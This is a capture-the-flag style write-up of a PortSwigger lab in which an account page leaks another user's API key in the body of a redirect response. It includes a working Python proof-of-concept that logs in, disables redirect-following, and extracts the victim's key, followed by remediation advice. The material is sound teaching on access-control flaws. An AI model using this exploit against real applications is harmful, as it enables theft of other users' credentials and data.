# User ID Controlled by Request Parameter with Data Leakage in Redirect — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-08-02

## The Problem

Like labs 7 and 8, the account page decided whose data to return based on a client-supplied `id` parameter (`/my-account?id=carlos`). This time, the application attempted to protect the endpoint by issuing a redirect (e.g. `302 Found` to the login page or an error page) when an unauthorized user tried to access another user's account.

However, the server generated the full response body — including the target user's sensitive data (their API key) — **before** performing the redirect. The redirect only changed where the browser was sent next; it did not prevent the sensitive data from already being included in that initial response.

## Discovery / Exploitation

1. Log in as a normal user (`wiener` / `peter`)
2. Request `/my-account?id=carlos` and disable automatic redirect following (e.g. `allow_redirects=False` in `requests`, or intercept in Burp before the browser follows the redirect)
3. Inspect the raw response body of that first response — even though the status code indicates a redirect (e.g. `302`) rather than success, the body still contains `carlos`'s leaked data, including their API key
4. A tool or script that automatically follows redirects (or a careless manual test that only checks the final destination) would miss this leak entirely, since the visible end result looks like "access denied"

## Impact

Sensitive data belonging to another user is exposed in a response the application intended to block — the redirect gives a false sense of security since the final page a normal browser lands on shows no unauthorized data, but the leak already happened in the initial response body. Any authenticated user can extract another user's API key by simply inspecting the raw HTTP response instead of letting the browser follow the redirect automatically.

## Proof of Concept (Python)

This script logs in as the low-privileged user, requests another user's (`carlos`) account page with redirect-following disabled, and extracts the leaked API key straight from the initial response body.

```python
import sys
import requests
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def carlos_api_key(s, url):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    print("(+) logging in as wiener user....")
    data_login = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text

    if "logout" in res:
        print("(+) successfully logged in as wiener..")
        print("(+) attempting to exploit access control vulnerability...")

        carlos_url = url + "/my-account?id=carlos"
        r = s.get(carlos_url, allow_redirects=False, verify=False, proxies=proxies)
        res = r.text

        if "carlos" in res:
            print("(+) retrieving API key...")
            match = re.search(r'Your API Key is: (.*?)</div>', res)
            if match:
                api_key = match.group(1)
                print("(+) API Key is: " + api_key)
            else:
                print("(-) could not find API key in the response")
                sys.exit(-1)
        else:
            print("(-) could not exploit access control vulnerability")
            sys.exit(-1)
    else:
        print("(-) could not log in as wiener...")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    carlos_api_key(s, url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Logs in as `wiener` using a session so cookies persist
2. Requests `/my-account?id=carlos` with `allow_redirects=False` — critically, this stops the script from automatically following any redirect, so it can inspect the raw initial response instead of ending up on the final (safe-looking) destination page
3. Searches that raw response body for `carlos`'s leaked API key, even though the response's status code likely indicates a redirect away from the page

## Remediation

The server must finish authorization checks **before** generating any part of the response body — not just before deciding where to redirect the user. If access is denied, the response must contain no sensitive data at all, regardless of the status code or redirect target. Sending a redirect is not a substitute for actually withholding the data.
